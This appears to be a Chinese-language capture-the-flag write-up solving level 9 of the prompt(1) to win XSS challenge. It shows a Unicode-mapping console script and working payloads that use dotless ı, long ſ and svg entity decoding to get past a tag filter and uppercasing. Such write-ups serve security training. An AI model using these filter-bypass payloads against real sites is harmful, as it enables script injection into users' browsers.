## [[prompt(1) to win](http://prompt.ml)] [[Level 9 – ECMAScript](http://prompt.ml/9)] [[解题报告](http://exp-blog.com/2019/03/24/pid-3691/)]

------

## 题目

```javascript
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}
```

## 解题报告

### 利用 toUpperCase

这题用正则 `<([a-zA-Z])` 把所有正常标签都过滤成了 `<_` ，而我们的输入内容都在 `<h1>` 标签里面，导致常规可以注入 JS 的标签基本都失效。

不过注意到题目会把我们输入的内容使用 `toUpperCase` 方法全部转换成大写。

一般情况下这个方法只对 ASCII 小写字母起作用，但是根据 [ECAMScript 定义](http://ecma-international.org/ecma-262/5.1/#sec-15.5.4.18)，这个方法对部分 Unicode 字符也会起作用，即它有意把某些 Unicode 字符映射到某些 ASCII 字符（串）。

![](http://exp-blog.com/wp-content/uploads/2019/03/8d5048a03e2d2ecc4641ed518e5f09d6.png)

但是我们不清楚这个具体的映射表是什么，是否可利用。

于是我简单写了这个 JS 代码，拷贝到浏览器的控制台运行，即可把 Unicode 通过 `toUpperCase` 方法映射到 ASCII 的映射表打印出来（*此代码只打印了 XSS 可能会用到的 ASCII 字符，并未把全部字符列印*）：

```javascript
UNICODE_RANGE = 65000;
XSS_ASCII_RANGE = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"/?><';:.,|\\+=-_*&^%$#@!~`\r\n"
for (i = 0; i < UNICODE_RANGE; i++) {
    raw_ch = String.fromCharCode(i)
    low_ch = "";
    upp_ch = "";

    if (XSS_ASCII_RANGE.includes(raw_ch.toLowerCase())) {
        low_ch = raw_ch.toLowerCase();
    }

    if (XSS_ASCII_RANGE.includes(raw_ch.toUpperCase())) {
        upp_ch = raw_ch.toUpperCase();
    }

    if ((low_ch != "" || upp_ch != "") && !(XSS_ASCII_RANGE.includes(raw_ch))) {
        console.log(
            "Unicode-Idx: [" + i + "], " + 
            "Raw-Unicode: [" + raw_ch + "], " + 
            "Unicode-Hex: [\\u" + (i).toString(16) + "], " + 
            "To-LowerCase-ASCII: [" + low_ch + "], " + 
            "To-UpperCase-ASCII: [" + upp_ch + "]");
    }
}
```

![](http://exp-blog.com/wp-content/uploads/2019/03/af4807b7e24620b22db5143800b951f6.png)

用运行结果来看，有两个字符的映射是明显对我们有用的：

- Unicode 的 `ı` 通过 `toUpperCase` 会被转换成 ASCII 的 `I`
- Unicode 的 `ſ` 通过 `toUpperCase` 会被转换成 ASCII 的 `S`

> 可以映射到 `ST` 的两个字符 `ﬅ` 或 `ﬆ` 也是可以利用的，只是相对没那么方便。

换言之，只要我们输入 `<ı` 或 `<ſ` ，即可绕过题目对标签名的正则过滤，而题目的 `toUpperCase` 方法又会帮我们将他们转换成 `<I` 或 `<S` 。

由于 HTML 的标签名和属性名都是大小写不敏感的，因此我们就可以利用这个特点，注入以 `I` 或 `S` 开头的标签。

由此首先想到可以的标签就有 3 个 ： `<IMG>` 、`<SCRIPT>` 、`<SVG>`

------------


### 绕过 toUpperCase

于是尝试注入 payload `<ımg src=0 onerror=prompt(1) />`

虽然成功注入为 `<IMG SRC=0 ONERROR=PROMPT(1) />` ，但是在触发 `onerror` 事件时报错：

`Uncaught ReferenceError: PROMPT is not defined`

原因是 JS 对函数名是大小写敏感的，而 `prompt` 也被转换成了大写。

![](http://exp-blog.com/wp-content/uploads/2019/03/ba3054766ee6cb5ebf31983ce0938c44.png)

此时我想到可以利用 `<svg>` **运行时才解析实体编码**的特性，对大写转换进行绕过。

即先把 `prompt` 编码成 `&#112;&#114;&#111;&#109;&#112;&#116;` ，这样实体编码在输出到前端之前， `toUpperCase` 对它就不起作用了。

然后再使用 `<svg>` 标签包围实体编码，实体编码就能在输出到前端后、在运行时被解析还原成 `prompt` 。

于是把 payload 修改成这样，完成挑战：

`<ſvg><ımg src=0 onerror=&#112;&#114;&#111;&#109;&#112;&#116;(1) /></svg>`

![](http://exp-blog.com/wp-content/uploads/2019/03/5d6a16a3831fbcf229822b32080fd9a2.png)

这个 payload 也是可以完成挑战的，相对简单点：

`<ſvg><ſcript>&#112;&#114;&#111;&#109;&#112;&#116;(1)</script></svg>`

![](http://exp-blog.com/wp-content/uploads/2019/03/e2886716d4959ca41b4f2ac0eb3412b8.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
